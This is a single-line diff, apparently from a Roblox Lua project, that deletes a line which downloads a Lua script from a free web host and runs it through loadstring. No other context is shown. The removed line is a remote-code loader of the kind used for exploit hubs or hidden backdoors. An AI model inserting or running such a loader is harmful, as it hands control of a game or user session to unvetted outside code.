@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://w3ave.000webhostapp.com/W3ave.lua'))()
